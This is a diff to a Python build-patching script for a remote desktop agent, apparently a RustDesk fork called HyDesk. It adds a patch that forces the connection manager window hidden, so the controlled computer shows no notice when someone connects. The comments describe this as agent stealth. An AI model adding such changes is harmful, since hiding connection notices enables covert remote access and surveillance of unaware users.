@@ -187,6 +187,64 @@ fn start_local_unlock_watcher(conn_id: i32) {
     print('patched privacy local unlock watcher')
 
 
+def patch_cm_hide(root):
+    """受控端连接时不弹任何提示窗口：连接管理器（CM）窗口强制隐藏。
+
+    上游逻辑：CM 进程启动时读 cm 配置 hide_cm == 'true' 才隐藏；但设置界面
+    里写这个配置的开关已被上游注释掉，实际永远 false → 每次有人连上来，
+    受控端右下角都弹出「连接管理器」窗口（用户报「受控端连接出现提示窗口」）。
+    这里在 agent 构建里强制隐藏：
+      1. main.dart runConnectionManagerScreen：hide 恒为 true；
+      2. server_model.dart：hideCm 字段默认 true（timerCallback / 客户端
+         状态更新里所有 showCmWindow 都被 !hideCm 守卫，一并关死）。
+    """
+    # 1) main.dart
+    p = os.path.join(root, 'flutter', 'lib', 'main.dart')
+    if not os.path.isfile(p):
+        raise SystemExit('main.dart not found: %s' % p)
+    with open(p, encoding='utf-8') as f:
+        src = f.read()
+
+    if 'agent 隐身：连接管理器窗口永不显示' not in src:
+        anchor = ("  final hide = await bind.cmGetConfig(name: \"hide_cm\")"
+                  " == 'true';\n"
+                  "  gFFI.serverModel.hideCm = hide;\n")
+        if anchor not in src:
+            raise SystemExit('patch failed: cm hide anchor not found in main.dart')
+        new = ("  // 【HyDesk】agent 隐身：连接管理器窗口永不显示（连接无任何提示）。\n"
+               "  // 上游 hide_cm 配置的设置入口已被注释，恒为 false，这里直接强制。\n"
+               "  final hide = true;\n"
+               "  gFFI.serverModel.hideCm = hide;\n")
+        src = src.replace(anchor, new, 1)
+        with open(p, 'w', encoding='utf-8', newline='\n') as f:
+            f.write(src)
+        print('patched main.dart: CM window never shown')
+    else:
+        print('main.dart CM hide already patched')
+
+    # 2) server_model.dart
+    p2 = os.path.join(root, 'flutter', 'lib', 'models', 'server_model.dart')
+    if not os.path.isfile(p2):
+        print('skip cm hide: server_model.dart not found')
+        return
+    with open(p2, encoding='utf-8') as f:
+        src = f.read()
+
+    if 'agent 隐身：CM 窗口默认隐藏' not in src:
+        anchor = '  bool hideCm = false;\n'
+        if anchor not in src:
+            raise SystemExit('patch failed: hideCm anchor not found')
+        src = src.replace(
+            anchor,
+            '  bool hideCm = true; // 【HyDesk】agent 隐身：CM 窗口默认隐藏\n',
+            1)
+        with open(p2, 'w', encoding='utf-8', newline='\n') as f:
+            f.write(src)
+        print('patched server_model.dart: hideCm defaults true')
+    else:
+        print('server_model.dart hideCm already patched')
+
+
 def main():
     root = sys.argv[1] if len(sys.argv) > 1 else '.'
     if not os.path.isfile(os.path.join(root, 'flutter', 'lib', 'main.dart')):
@@ -198,6 +256,7 @@ def main():
     patch_main_cpp(root)
     patch_broker_exe(root)
     patch_privacy_local_unlock(root)
+    patch_cm_hide(root)
 
 
 if __name__ == '__main__':
